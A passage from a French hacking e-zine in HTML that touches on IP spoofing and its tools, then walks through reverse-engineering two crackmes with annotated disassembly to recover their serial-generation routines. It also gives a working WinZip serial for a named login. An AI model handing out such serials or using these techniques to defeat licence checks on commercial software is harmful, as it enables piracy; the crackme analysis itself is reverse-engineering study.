      <b>les fichiers .rhosts</b>. Pour ce faire passer pour une machine on utilise 
      le forgage d'IP et pour se d&eacute;barrasser de l'autre on utilise toute 
      sorte de Denial of Service.<br>
      Revenons &agrave; notre exemple avec le mec du cybercaf&eacute; : il a dut 
      donner son signalement &agrave; la meuf pour qu'ils puissent se reconna&icirc;tre. 
      Soit vous savez tout ce qu'il a dit (&quot;je porterais un jean bleu et 
      un tshirt noir&quot;) soit vous savez pas et l&agrave; il va falloir deviner... 
      Le premier cas est dit <b>Non-Blind Spoofing</b> (non aveugle), il se fait 
      lorsque votre ennemi est sur le m&ecirc;me sous r&eacute;seau que vous et 
      l&agrave; vous pouvez donc sniffer toute la conversation. Le second cas 
      est le <b>Blind Spoofing </b>et l&agrave; c bien plus compliqu&eacute;.<br>
      On peut en fait diviser le spoofing en 3 &eacute;tapes : forger ses paquets, 
      killer l'ennemi et voler la connection (hijack). Mais bon c'est pas mon 
      but de faire un grand article sur le sujet car il y en a d'autres qui l'on 
      d&eacute;j&agrave; fait (Phrack 48 article 14).<br>
      Pour forger ses paquets sous win je peux citer :MiSoSKiaN's Packet Builder 
      (fonctionnalit&eacute;es limit&eacute;es au maximum), exploit generator 
      de la team aggressor (mode confirm&eacute; et mode simple), wINJECT (j'aime 
      bien la fa&ccedil;on dont il marche : utilisation de scripts textes avec 
      des exemples bien s&ucirc;r ;-), Rafale X (tr&egrave;s bien pr&eacute;sent&eacute;...) 
      ainsi que NetCat qui propose un tas d'autres fonctionnalit&eacute;es.<br>
      Sous Unix, ben yen a un peut partout. Mais ya spoofit qui est fait expr&egrave;s 
      pour un spoof complet ;-)<br>
      Voil&agrave;, j'esp&egrave;re que ma repr&eacute;sentation vous aura fait 
      comprendre comment &ccedil;a marche.</td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="subheading"><b><u>Petit entracte hors 
      menu</u></b></td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="normalText">Je sais plus si je vous avait 
      donn&eacute; un truc sur le <b>crackage de Winzip</b>. Si oui oubliez le, 
      c'&eacute;tait mon premier tut de cack et il est pas bon. On va pas voir 
      en d&eacute;tail le crack. Il faut juste d&eacute;buger avec W32Dasm la 
      routine de v&eacute;rification en utilisant les step onto avec un API documentation 
      et au bo&ucirc;t d'un moment il tombe sur la fonction strcmp qui compare 
      notre pass &agrave; un pass g&eacute;n&eacute;r&eacute;. On note ce pass 
      et &eacute;videmment c'est le pass &agrave; entrer. Donc pour le <b>login 
      'Sirius Black' </b>(respectez les espaces et les majuscules) vous mettez 
      le <b>serial 17855772</b>. Voil&agrave; mea coulpa, vive le banania et legalize 
      Banga !!!</td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="subheading"><b><u><a name="keygen1"></a>Cracking 
      1 (Keygenning)</u></b></td>
  </tr>
  <tr> 
    <td valign="top" height="1639" class="normalText"> 
      <p>Allez on vous g&acirc;te !!! (enfin je vous g&acirc;te puisque je suis 
        tout seul). Comme &agrave; chaque vacances, je fais pas mal de cracking 
        (because pas acc&egrave;s au net) et je progresse pas mal &agrave; chaque 
        fois. Ca m'a permis aux derni&egrave;res vacances d'&eacute;tudier une 
        technique de cracking 1000 fois plus &eacute;l&eacute;gante que la modification 
        d'un prog : le <b>keygening</b>. C'est juste le fait de trouver en code 
        d'enregistrement valide ou mieux : de cr&eacute;er un prog qui vas g&eacute;n&eacute;rer 
        des serials valides.<br>
        Je cherchais les sites de grosses team de cracking comme Razor1911, Deviance, 
        Fairlight, Laxity, Eminence (ben non il font pas que des cale&ccedil;ons... 
        Arf !!! Je suis trop fort, a ouais trop content de ma connerie... ha !! 
        enfin bon) et puis TNT Crackers. Et comme la plupart n'ont pas de sites 
        officiels, je suis tomb&eacute; sur d'autres sites o&ugrave; ils proposaient 
        des crackmes dont j'en ai pris 3, tous &agrave; keygenner. Ou trouver 
        ces crackmes donc ? sur <b>crakmes.cjb.net</b> Bon on commence tout doux 
        avec celui de <b>Duelist</b>.<br>
        Comme d'habitude avec les progs &agrave; cracker, on cheche l'erreur. 
        Ici on n'a pas le choix : ya que deux bo&icirc;tes de textes qui sont 
        user name et registration code. Puis en dessous ya 2 boutons : check et 
        close. D&eacute;j&agrave; on se dit qu'&agrave; priori le prog ne v&eacute;rifie 
        pas le serial au fur et &agrave; mesure donc c plus facile :-)<br>
        Bon comme ce prog est provocateur (il attend que &ccedil;a de se faire 
        cracker, salope vas !!!) on entre un nom au pif (Sirius pour moi) et pi 
        un serial au hazard, par exemple 205 car c un sacr&eacute; num&eacute;ro 
        (enfin parait). On clique sur check et l&agrave; on se prend une veste 
        : &quot;Your registration info is invalid...&quot; etc etc. Donc on lance 
        Win32Dasm et l&agrave;... merde pas de string data ref... Bon je vous 
        avais dit comment faire avec un h&eacute;diteur hexa et un peu de calcul. 
        Mais ya plus simple, vous cliquez sur le bouton Data Hex et vous avez 
        &ccedil;a :</p>
      <p>:<span class="script">00402088 6E 20 28 77 6F 72 6B 69 n (worki<br>
        :00402090 6E 67 20 6F 6E 65 29 20 ng one) <br>
        :00402098 74 6F 20 64 75 65 6C 69 to dueli<br>
        :004020A0 73 74 40 62 65 65 72 2E st@beer.<br>
        <font color="#FF0000">:004020A8</font> 63 6F 6D 21 00 20 <font color="#FF0000">59</font> 
        6F com!. <font color="#FF0000">Y</font>o<br>
        :004020B0 75 72 20 72 65 67 69 73 ur regis<br>
        :004020B8 74 72 61 74 69 6F 6E 20 tration <br>
        :004020C0 69 6E 66 6F 20 69 73 20 info is <br>
        :004020C8 69 6E 76 61 6C 69 64 2E invalid.<br>
        :004020D0 2E 2E 20 4E 6F 74 65 20 .. Note <br>
        :004020D8 74 68 61 74 20 6D 6F 73 that mos<br>
        :004020E0 74 20 6F 66 20 74 68 65 t of the<br>
        :004020E8 20 73 70 65 63 69 61 6C special<br>
        :004020F0 20 63 68 61 72 73 20 6D chars m<br>
        :004020F8 61 79 20 72 61 69 73 65 ay raise<br>
        :00402100 20 72 65 67 69 73 74 72 registr<br>
        :00402108 61 74 69 6F 6E 20 70 72 ation pr</span><br>
        <br>
        Oui je sais vous &ecirc;tes impressionn&eacute; ;-) Bon fini les conneries. 
        Notre phrase comme en a8, a9, aa, ab... en AE !! Avec la lettre 'Y' soit 
        59 en hexa. Donc on va chercher dans le prog un &quot;push 004020AE&quot;. 
        Non seulement on le trouve mais en plus yen a qu'un. Si vous suivez pas 
        je vous conseille de lire les anciens LOTFREE car ce num&eacute;ro est 
        d&eacute;j&agrave; bien long et je rajouterais pas d'explications. Le 
        push est &agrave; l'adresse 00401224 :<br>
        <br>
        <span class="script">* Referenced by a (U)nconditional or (C)onditional 
        Jump at Addresses:<br>
        |:0040113F(C), :00401148(C), :00401163(C), :0040116B(C), :004011B1(C)<br>
        |:004011B6(C), :004011F9(U)<br>
        |<br>
        :0040121A 6800200000 push 00002000<br>
        :0040121F 6801204000 push 00402001<br>
        :00401224 68AE204000 <font color="#FF0000">push 004020AE</font><br>
        :00401229 6A00 push 00000000</span></p>
      <p class="normalText"><span class="script">* Reference To: USER32.MessageBoxA, 
        Ord:0000h<br>
        |<br>
        :0040122B E836010000 Call 00401366<br>
        :00401230 B800000000 mov eax, 00000000<br>
        :00401235 E9DFFEFFFF jmp 00401119</span><br>
        <br>
        <span class="normalText">On peut voir qu'en dessous ya un appel &agrave; 
        USER32.MessageBoxA qui est donc la fonction qui r&eacute;cup&egrave;re 
        ce message. Au dessus on voit les references des sauts qui ont pu nous 
        amener ici : 6 conditionnels et 1 inconditionnel. Pas de panique, en g&eacute;n&eacute;ral 
        ils se trouvent c&ocirc;tes &agrave; c&ocirc;tes et sont justes des v&eacute;rifications 
        minimes tels que presence du login, presence du pass, longueur du login 
        et du pass, validit&eacute; du login (par exemple il faut pas qu'il contienne 
        de caract&egrave;res sp&eacute;ciaux) et puis validit&eacute; du pass.<br>
        Au &eacute;tudie les premiers jumps :<br>
        <br>
        </span><span class="script">* Reference To: USER32.SendDlgItemMessageA, 
        Ord:0000h<br>
        |<br>
        :00401132 E841020000 Call 00401378<br>
        :00401137 A3AF214000 mov dword ptr [004021AF], eax<br>
        :0040113C 83F800 cmp eax, 00000000 <font color="#FF0000">//si eax=0</font><br>
        :0040113F 0F84D5000000 je 0040121A <font color="#FF0000">//bad boy</font><br>
        :00401145 83F808 cmp eax, 00000008 <font color="#FF0000">//si eax&gt;8</font><br>
        :00401148 0F8FCC000000 jg 0040121A</span> <font color="#FF0000">//bad 
        boy</font><br>
        <span class="script">:0040114E 8BF0 mov esi, eax </span><font color="#FF0000">//important 
        pour la suite</font><br>
        <br>
        Perso j'utilise beaucoup le d&eacute;buggeur de Win32Dasm (avec les break 
        : Ctrl+click_gauche) et apr&egrave;s quelques tests, on comprend que le 
        SendDlgItemMessageA est une fonction qui renvoie la longeur de notre login 
        dans eax. Avec l'option documentation API et un Step Into on a :<br>
        <br>
        <span class="script">API LONG Arg00 = SendDlgItemMessageA(Arg01,Arg02,Arg03,Arg04,Arg05)<br>
        API Address=00401378, API Return Address=00401137<br>
        Arg01 = (HWND) 000000b8 (Window&quot;Duelist's Crackme #4&quot;)<br>
        Arg02 = (int) 00000003<br>
        Arg03 = (uMSG) 0000000e -&gt;WM_GETTEXTLENGTH<br>
        Arg04 = (WPARAM) 00000000<br>
        Arg05 = (LPARAM) 00000000</span></p>
      <p><span class="script">RESULT for API SendDlgItemMessageA<br>
        Arg00 = (LONG) 00000006<br>
        Arg01 = (HWND) 000000b8 (Window&quot;Duelist's Crackme #4&quot;)<br>
        Arg02 = (int) 00000003<br>
        Arg03 = (uMSG) 0000000e -&gt;WM_GETTEXTLENGTH<br>
        Arg04 = (WPARAM) 00000000<br>
        Arg05 = (LPARAM) 00000000</span><br>
        <br>
        L&agrave; &ccedil;a me para&icirc;t plus parlant non ? Le r&eacute;sultat 
        peut se voir dans Arg00 soit une longueur de 6 pour &quot;Sirius&quot;. 
        On regarde notre comparaison au dessus --&gt; si longueur(login) est = 
        0 ou &gt;8 alors erreur. On a d&eacute;j&agrave; niqu&eacute; 2 conditions. 
        Juste apr&egrave;s on a :</p>
      <p class="script">* Reference To: USER32.SendDlgItemMessageA, Ord:0000h<br>
        |<br>
        :0040115B E818020000 Call 00401378<br>
        :00401160 83F800 cmp eax, 00000000<br>
        :00401163 0F84B1000000 je 0040121A<br>
        :00401169 3BF0 cmp esi, eax<br>
        :0040116B 0F85A9000000 jne 0040121A</p>
      <p>Pareil on se rend compte que c'est la m&ecirc;me fonction mais cette 
        fois elle renvoie 3 qui est comme par hazard la longueur de notre serial. 
        Ensuite on v&eacute;rifie si on a entr&eacute; quelque chose (cmp eax,0) 
        et puis on compare la longueur du serial avec celle du login qui &eacute;tait 
        en m&eacute;moire dans esi. Conclusion : le serial doit faire la m&ecirc;me 
        longueur que le login. D&eacute;j&agrave; 4 saut de niqu&eacute; ! On 
        entre donc un serial du style 123456. Et on relance le d&eacute;bugueur. 
        On met un break sur la zone :</p>
      <p class="script">:00401171 6860214000 push 00402160<br>
        :00401176 6A08 push 00000008<br>
        :00401178 6A0D push 0000000D<br>
        :0040117A 6A03 push 00000003<br>
        :0040117C FF7508 push [ebp+08]</p>
      <p class="script">* Reference To: USER32.SendDlgItemMessageA, Ord:0000h<br>
        |<br>
        :0040117F E8F4010000 Call 00401378</p>
      <p>Le prog appelle alors une autre fonction (c'est le m&ecirc;me call mais 
        pas la m&ecirc;me fonction, un peu comme les interruptions et les services 
        ;-) :</p>
      <p class="script">:00401171 6860214000 push 00402160<br>
        :00401176 6A08 push 00000008<br>
        :00401178 6A0D push 0000000D<br>
        :0040117A 6A03 push 00000003<br>
        :0040117C FF7508 push [ebp+08]</p>
      <p class="script">* Reference To: USER32.SendDlgItemMessageA, Ord:0000h<br>
        |<br>
        :0040117F E8F4010000 Call 00401378</p>
      <p>et les APIs donnent :</p>
      <p class="script">API LONG Arg00 = SendDlgItemMessageA(Arg01,Arg02,Arg03,Arg04,Arg05)<br>
        API Address=00401378, API Return Address=00401184<br>
        Arg01 = (HWND) 00000864 (Window&quot;Duelist's Crackme #4&quot;)<br>
        Arg02 = (int) 00000003<br>
        Arg03 = (uMSG) 0000000d -&gt;WM_GETTEXT<br>
        Arg04 = (WPARAM) 00000008<br>
        Arg05 = (LPARAM) 00402160</p>
      <p class="script">RESULT for API SendDlgItemMessageA<br>
        Arg00 = (LONG) 00000006<br>
        Arg01 = (HWND) 00000864 (Window&quot;Duelist's Crackme #4&quot;)<br>
        Arg02 = (int) 00000003<br>
        Arg03 = (uMSG) 0000000d -&gt;WM_GETTEXT<br>
        Arg04 = (WPARAM) 00000008<br>
        Arg05 = (LPARAM) 00402160</p>
      <p></p>
      <p>Comme son nom l'indique cette fonction lit une cha&icirc;ne de caract&egrave;res, 
        met le r&eacute;sultat &agrave; l'adresse donn&eacute;e en argument : 
        00402160<br>
        Et de plus, la longueur de la chaine est renvoy&eacute;e. On clique sur 
        Data Hex (comme tout &agrave; l'heure et on apper&ccedil;oit entre autres 
        notre login &agrave; 00402160. Ensuite c'est la m&ecirc;me fonction mais 
        avec le serial qui se met en 00402179.<br>
        Ensuite on tombe sur un bon morceau de code :</p>
      <p>Routine de g&eacute;n&eacute;ration du password :<br>
        <span class="script">* Referenced by a (U)nconditional or (C)onditional 
        Jump at Address:<br>
        |:004011D9(U)<br>
        |<br>
        :0040119C 41 inc ecx <font color="#FF0000">//pointeur sur le username 
        et sur le serial</font><br>
        :0040119D 0FBE8160214000 movsx eax, byte ptr [ecx+00402160] <font color="#FF0000">//met 
        le car en cours dans eax</font><br>
        :004011A4 83F800 cmp eax, 00000000 <font color="#FF0000">//regarde si 
        la chaine est termin&eacute;e</font><br>
        :004011A7 7432 je 004011DB <font color="#FF0000">//si c'est le cas on 
        arr&ecirc;te</font><br>
        :004011A9 BEFFFFFFFF mov esi, FFFFFFFF<br>
        :004011AE 83F841 cmp eax, 00000041 <font color="#FF0000">//si le car &lt; 
        'A' =&gt;Bad Guy</font><br>
        :004011B1 7C67 jl 0040121A<br>
        :004011B3 83F87A cmp eax, 0000007A <font color="#FF0000">//si le car &gt; 
        'z' =&gt;Bad Guy</font><br>
        :004011B6 7762 ja 0040121A<br>
        :004011B8 83F85A cmp eax, 0000005A <font color="#FF0000">//si le car &lt; 
        'Z'</font><br>
        :004011BB 7C03 jl 004011C0 <font color="#FF0000">//on passe a la cle</font><br>
        :004011BD 83E820 sub eax, 00000020 <font color="#FF0000">//sinon on passe 
        en majuscules</font></span></p>
      <p class="script">* Referenced by a (U)nconditional or (C)onditional Jump 
        at Addresses:<br>
        |:004011BB(C), :004011CA(C)<br>
        |<br>
        :004011C0 46 inc esi <font color="#FF0000">//pointeur sur les chaines 
        de calcul</font><br>
        :004011C1 0FBE9617204000 movsx edx, byte ptr [esi+00402017]<br>
        :004011C8 3BC2 cmp eax, edx <font color="#FF0000">//compare le car du 
        user name avec celui de la chaine</font><br>
        :004011CA 75F4 jne 004011C0 <font color="#FF0000">//on recommence jusqu'&agrave; 
        ce que &ccedil;a coincide</font><br>
        :004011CC 0FBE863C204000 movsx eax, byte ptr [esi+0040203C] <font color="#FF0000">//l'indice 
        du car dans la chaine de calcul</font><br>
        :004011D3 898194214000 mov dword ptr [ecx+00402194], eax <font color="#FF0000">//correspond 
        &agrave; l'indice du car dans la seconde chaine (fabrication du serial)</font><br>
        :004011D9 EBC1 jmp 0040119C</p>
      <p class="normalText">Dans cette routine on s'apper&ccedil;oit que si un 
        des caract&egrave;res du login n'est pas une lettre alors on a un message 
        d'erreur. De plus si c'est une minuscule alors on la transforme en majuscule. 
        On remarque deux adresses m&eacute;moires que l'on avait pas vu auparavant 
        qui sont :</p>
      <p class="script">Address: 00402017 is in Module: DUE-CM4.EXE<br>
        char[035]:&quot;A1L<font color="#FF0000">S</font>K2DJF4HGP3QWO5EIR6UTYZ8MXN7CBV9&quot; 
        <br>
        DWORD:534c3141, WORD:3141, BYTE:41<br>
        CODE: inc ecx<br>
        ---------------------------------------------------<br>
        Address: 0040203C is in Module: DUE-CM4.EXE<br>
        char[035]:&quot;SU7CSJKF09NCSDO9SDF09SDRLVK7809S4NF&quot; <br>
        DWORD:43375553, WORD:5553, BYTE:53<br>
        CODE: push ebx</p>
      <p class="normalText">Si la lettre en cours est en majuscule alors on peut 
        calculer. Voici un exemple. Premier caract&egrave;re de la cha&icirc;ne 
        (&quot;Sirius&quot;) = 'S'. On cherche se position dans la cha&icirc;ne 
        00402017. La lettre est la 4&egrave;me. On r&eacute;cup&egrave;re alors 
        la 4&egrave;me lettre de la seconde cha&icirc;ne de calcul : 'C'. Ensuite 
        avec les incr&eacute;menteurs (esi,ecx) on passe au caract&egrave;re suivant. 
        On passe &agrave; la seconde lettre : 'i'. On la met en majuscule, on 
        cherche dans la cha&icirc;ne de calcul1 sa position : 20. Puis on prend 
        la 20&egrave;me lettre de la cha&icirc;ne de calcul2, ce qui nous donne 
        : '0'. Et ainsi de suite ; &agrave; la fin on obtient la chaine &quot;C090DC&quot;. 
        Mais &agrave; priori on ne sait pas &agrave; quoi elle sert (m&ecirc;me 
        si on devine). On le sait vraiment l&agrave; :</p>
      <p class="normalText">routine de v&eacute;rification du password (suite 
        directe du prog):<br>
        <span class="script">* Referenced by a (U)nconditional or (C)onditional 
        Jump at Address:<br>
        |:004011A7(C)<br>
        |<br>
        :004011DB FF35AF214000 push dword ptr [004021AF]<br>
        :004011E1 6894214000 push 00402194 <font color="#FF0000">//met le serial 
        genere sur la pile</font><br>
        :004011E6 6879214000 push 00402179 <font color="#FF0000">//met votre password 
        sur la pile</font><br>
        :004011EB E854000000 call 00401244 <font color="#FF0000">//appelle la 
        fonction de comparaison</font><br>
        :004011F0 83F801 cmp eax, 00000001 <font color="#FF0000">//resultat dans 
        eax</font><br>
        :004011F3 0F84DEFEFFFF je 004010D7 <font color="#FF0000">//eax=1 =&gt;Good 
        Guy</font><br>
        :004011F9 EB1F jmp 0040121A <font color="#FF0000">//=&gt;Bad Guy</font></span></p>
      <p class="normalText">Ici on a droit &agrave; une b&ecirc;te fonction strcmp 
        qui renvoie 1 si les 2 cha&icirc;nes pass&eacute;es en arguments sont 
        identiques.<br>
        Dans ce cas, la fonction de calcul est tr&egrave;s simple et je ne met 
        pas les sources d'un keygen pour cet exemple. On peut aussi bien utiliser 
        le C que le pascal, le php et m&ecirc;me le javascript.</p>
    </td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="subheading"><b><u><a name="keygen2"></a>Cracking 
      2 (toujours du keygenning)</u></b></td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="normalText"> 
      <p>Bon, reprenez votre suffle parce que la &ccedil;a va &ecirc;tre plus 
        dur. Il s'agit d'un crack en pur Win32Asm cod&eacute; par <b>THE_q de 
        la PhroZen Crew</b>. Alors comme d'hab on le lance, on entre un nom bidon 
        (Sirius) et un code bidon (666) ; petit probl&egrave;me : quand on valide 
        il se passent que dalle donc on se dit merde, des complications... Et 
        bien nom, on d&eacute;sassemble avec Win32Dasm, on va dans les String 
        Data References et on voit &quot;Cool !! U found a correct Serial ! =)&quot;.<br>
        On regarde quand est appel&eacute; ce texte , d'o&ugrave; on vient etc. 
        On met des breaks avant, histoire de voir se qui se passe et puis au bo&ucirc;t 
        d'un moment on en tire le bo&ucirc;t de programme suivant :</p>
      <p class="script">:004012C4 6A65 push 00000065<br>
        :004012C6 FF7508 push [ebp+08]</p>
      <p class="script">* Reference To: USER32.GetDlgItem, Ord:0000h<br>
        |<br>
        :004012C9 E852010000 Call 00401420<br>
        :004012CE 68A9214000 push 004021A9<br>
        :004012D3 6A28 push 00000028<br>
        :004012D5 6A0D push 0000000D<br>
        :004012D7 50 push eax</p>
      <p class="script">* Reference To: USER32.SendMessageA, Ord:0000h <font color="#FF0000">// 
        API interessante</font><br>
        |<br>
        :004012D8 E873010000 Call 00401450<br>
        :004012DD A2D1214000 mov byte ptr [004021D1], al<br>
        :004012E2 3C00 cmp al, 00 <font color="#FF0000">// tient &ccedil;a ressemble</font><br>
        :004012E4 7467 je 0040134D<br>
        :004012E6 90 nop<br>
        :004012E7 90 nop<br>
        :004012E8 90 nop<br>
        :004012E9 90 nop<br>
        :004012EA 3C08 cmp al, 08 <font color="#FF0000">// &agrave; quelque chose 
        qu'on a vu tout a l'heure</font> <br>
        :004012EC 7309 jnb 004012F7<br>
        :004012EE 90 nop<br>
        :004012EF 90 nop<br>
        :004012F0 90 nop<br>
        :004012F1 90 nop<br>
        :004012F2 E85F000000 call 00401356</p>
      <p class="script">* Referenced by a (U)nconditional or (C)onditional Jump 
        at Address:<br>
        |:004012EC(C)<br>
        |<br>
        :004012F7 6A00 push 00000000<br>
        :004012F9 6A00 push 00000000</p>
      <p class="script">* Possible Reference to Dialog: DialogID_0001, CONTROL_ID:0066, 
        &quot;&quot;<br>
        |<br>
        :004012FB 6A66 push 00000066<br>
        :004012FD FF7508 push [ebp+08]</p>
      <p class="script">* Reference To: USER32.GetDlgItemInt, Ord:0000h <font color="#FF0000">// 
        Interessant</font><br>
        |<br>
        :00401300 E821010000 Call 00401426<br>
        :00401305 A3D2214000 mov dword ptr [004021D2], eax<br>
        :0040130A 3C00 cmp al, 00<br>
        :0040130C 743F je 0040134D<br>
        :0040130E 90 nop<br>
        :0040130F 90 nop<br>
        :00401310 90 nop<br>
        :00401311 90 nop<br>
        :00401312 E85E000000 call 00401375<br>
        :00401317 E8A5000000 call 004013C1<br>
        :0040131C 85C0 test eax, eax <font color="#FF0000">// On teste eax</font><br>
        :0040131E 742D je 0040134D <font color="#FF0000">// si c'est egal &agrave; 
        0 on saute</font><br>
        :00401320 90 nop<br>
        :00401321 90 nop<br>
        :00401322 90 nop<br>
        :00401323 90 nop<br>
        :00401324 6A00 push 00000000</p>
      <p class="script">* Possible StringData Ref from Data Obj -&gt;&quot;Correct 
        !&quot; <font color="#FF0000">// sinon c'est que le pass est bon</font><br>
        |<br>
        :00401326 689F214000 push 0040219F</p>
      <p class="script">* Possible StringData Ref from Data Obj -&gt;&quot; C00L 
        !! U found a correct &quot;<br>
        -&gt;&quot;Serial ! =)&quot;<br>
        |<br>
        :0040132B 683A214000 push 0040213A<br>
        :00401330 FF7508 push [ebp+08]</p>
      <p class="script">* Reference To: USER32.MessageBoxA, Ord:0000h<br>
        |<br>
        :00401333 E806010000 Call 0040143E</p>
      <p>On d&eacute;bugge le prog, la premi&egrave;re API (GetDlgItem) ne nous 
        interesse pas &agrave; priori. Pour la seconde (SendMessage) plusieurs 
        param&egrave;tres sont pass&eacute;s dont une adresse en m&eacute;moire 
        : 004021A9. On met un break avant et apr&egrave;s le call puis on va voir 
        en m&eacute;moire ce qui a &eacute;t&eacute; mis en 4021A9. On clique 
        sur data hex puis on trouve :</p>
      <p class="script">:00402178 79 20 65 2D 6D 61 69 6C y e-mail<br>
        :00402180 20 74 6F 20 3A 20 50 68 to : Ph<br>
        :00402188 72 6F 7A 65 6E 5F 71 40 rozen_q@<br>
        :00402190 63 79 62 65 72 64 75 64 cyberdud<br>
        :00402198 65 2E 63 6F 6D 20 00 43 e.com .C<br>
        :004021A0 6F 72 72 65 63 74 20 21 orrect !<br>
        :004021A8 00 53 69 72 69 75 73 00 .Sirius.<br>
        :004021B0 8F 00 00 00 00 00 00 00 ........<br>
        :004021B8 00 00 00 00 00 00 00 00 ........<br>
        :004021C0 00 00 00 00 00 00 00 00 ........<br>
        :004021C8 00 00 00 00 00 00 00 00 ........<br>
        :004021D0 00 06 9A 02 00 00 50 68 ......Ph<br>
        :004021D8 72 6F 5A 65 6E 51 00 00 roZenQ..<br>
        :004021E0 00 00 00 00 00 00 00 00 ........<br>
        :004021E8 00 00 00 00 00 00 00 00 ........<br>
        :004021F0 00 00 00 00 00 00 00 00 ........<br>
        :004021F8 00 00 00 00 00 00 00 00 ........</p>
      <p>On voit bien notre login (Sirius) &agrave; l'adresse pr&eacute;vu mais 
        on remarque aussi la cha&icirc;ne &quot;PhroZenQ&quot; qui est sans doute 
        ici pour encrypter notre login ou notre pass plus tard. On comprend aussi 
        que la longeur du nom qu'on entre est renvoy&eacute; dans eax (6 dans 
        notre cas). Ensuite le prog v&eacute;rifie si on a entr&eacute; quelque 
        chose. Si ya rien on se casse. Ensuite on regarde si le login a au moins 
        8 caract&egrave;res, si c'est la cas le login est valid&eacute; sinon 
        on appelle le call 00401356.</p>
      <p>A partir de maintenant je designerais cette proc&eacute;dure comme le 
        <b>PRE-CALL</b>. Que fait-il ? Et bien il modifie notre login si ce dernier 
        a une longueur comprise entre 1 et 7 inclus. Voici le call :</p>
      <p class="script">* Referenced by a CALL at Address:<br>
        |:004012F2 <br>
        |<br>
        :00401356 33DB xor ebx, ebx <font color="#FF0000">// met ebx &agrave; 
        zero</font><br>
        :00401358 8A1DD1214000 mov bl, byte ptr [004021D1]<font color="#FF0000">//la 
        longueur de notre login </font><br>
        :0040135E B108 mov cl, 08 <font color="#FF0000">// cl=8;</font><br>
        :00401360 2ACB sub cl, bl <font color="#FF0000">// cl = 8 - longeur(login)</font><br>
        :00401362 BFA9214000 mov edi, 004021A9 <font color="#FF0000">// l'adresse 
        de notre login</font><br>
        :00401367 6603FB add di, bx <font color="#FF0000">// edi = edi + bl</font><br>
        :0040136A B030 mov al, 30 <font color="#FF0000">// al est initialis&eacute;e 
        &agrave; 30 en hexa soit '0' </font><br>
        :0040136C AA stosb <font color="#FF0000">// je vais vous expliquer &ccedil;a</font><br>
        :0040136D FEC0 inc al <font color="#FF0000">// on incr&eacute;mente al</font><br>
        :0040136F E2FB loop 0040136C <font color="#FF0000">// boucle vers 0040136C</font><br>
        :00401371 C60700 mov byte ptr [edi], 00 <font color="#FF0000">// met 0 
        dans edi</font><br>
        :00401374 C3 ret</p>
      <p>Bon, petit cours de ratrapage pour les nuls :<br>
        Avec les progr&egrave;s des processeurs, les registres ont gagn&eacute;s 
        en taille. Maintenant les programmes sont cod&eacute;s en 32 bits soit 
        4 octets. 4 octets c'est la taille qui sert pour d&eacute;signer une adresse 
        en m&eacute;moire (par exemple 004021A9). Les registres comme ebx prennent 
        eux aussi 4 octets mais &agrave; une &eacute;poque ils ne prenaient que 
        2 octets, on avait alors droit au registre bx qui est l'anc&egrave;tre 
        de ebx. En fait on a juste augment&eacute; sa taille mais les ancien noms 
        on subsist&eacute;s et serve toujours (ils sont d'ailleurs tr&egrave;s 
        pratique). Peit exemple avec ebx </p>
      <div align="left"> </div>
      <table width="250" border="1" cellspacing="0" cellpadding="0" align="left" dwcopytype="CopyTableRow">
        <tr bgcolor="#FFFFFF"> 
          <th colspan="3"> 
            <div align="center"><font color="#000000" face="Verdana, Arial, Helvetica, sans-serif" size="2">EBX 
              (32 bits)</font></div>
          </th>
        </tr>
        <tr bgcolor="#FFFFFF"> 
          <td width="50%"> 
            <div align="center"></div>
          </td>
          <td width="50%" colspan="2"> 
            <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000">BX 
              (16 bits)</font></div>
          </td>
        </tr>
        <tr> 
          <td bgcolor="#66CC00">&nbsp;</td>
          <td bgcolor="#66CC00"> 
            <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000">BH 
              (8) </font></div>
          </td>
          <td bgcolor="#66CC00"> 
            <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000">BL 
              (8) </font></div>
          </td>
        </tr>
      </table>
      <div align="left"></div>
      <div align="left"></div>
      <p>Bref, quand on parle de EBX, on parle aussi de BX (sa moiti&eacute;) 
        puis de BH (H comme high) et BL (L comme low). Ainsi si on a EBX = 0040A9B8 
        et que l'on fait un mov bx, <font color="#FF00FF">4D56</font> alors on 
        aura EBX = 0040<font color="#FF00FF">4D56</font>. C'est pareil pour di 
        (16 bits) qui est pass&eacute; &agrave; edi (32 bits). En gros les registres 
        de 32 bits commencent par un 'e'.</p>
      <p>Maintenant analysons le <b>PRE-CALL</b>. Au d&eacute;but on met EBX &agrave; 
        0.<br>
        On a donc EBX = 00000000 (vu qu'il fait 32 bits).<br>
        Ensuite on met dans bl (registre de 8 bits soit un octet) la longueur 
        sur un octet de notre login.<br>
        Comme bl est une partie de EBX, on a EBX = 000000XX o&ugrave; XX est la 
        longueur de notre chaine en hexa.<br>
        Puis cl initialis&eacute; &agrave; 8. Ensuite on retranche la longueur 
        de notre login &agrave; cl.<br>
        mov edi, 004021A9 signifie que edi prend l'adresse de notre login (&agrave; 
        ne pas confondre avec la valeur). On dit que edi &quot;pointe&quot; sur 
        le premier caract&egrave;re de la chaine. di est ensuite augment&eacute; 
        de bx (la longueur) : di pointe donc maintenant sur le caract&egrave;re 
        de fin de chaine (apr&egrave;s le dernier caract&egrave;re).<br>
        L'instruction <b>stosb</b> je vais vous l'expliquer en dernier.<br>
        Inc al est l'&eacute;quivalent de al = al + 1;<br>
        <b>Loop</b> Adresse est une boucle qui retourne &agrave; Adresse tant 
        que ecx n'est pas &eacute;gal &agrave; 0. A chaque fois que l'on rencontre 
        Loop, ecx est d&eacute;cr&eacute;ment&eacute;.<br>
        mov byte ptr[edi], 00 signifie que l'on met dans l'octet point&eacute; 
        par edi la valeur 0.</p>
      <p>L'instruction stosb est une instruction tr&egrave;s utilis&eacute; pour 
        les chaines de caract&egrave;res. A chaque fois que l'on crois stosb, 
        le contenu de al est mis dans l'octet point&eacute; par edi, puis edi 
        est incr&eacute;ment&eacute;.<br>
        Dans notre cas, edi pointe d'abord sur la fin de la chaine et al vaut 
        30 soit le caract&egrave;re '0'.<br>
        On passe par stosb, '0' se retrouve donc &agrave; la fin de notre chaine 
        (on a maintenant 'Sirius0').<br>
        al est ensuite incr&eacute;ment&eacute; (al devient le caract&egrave;re 
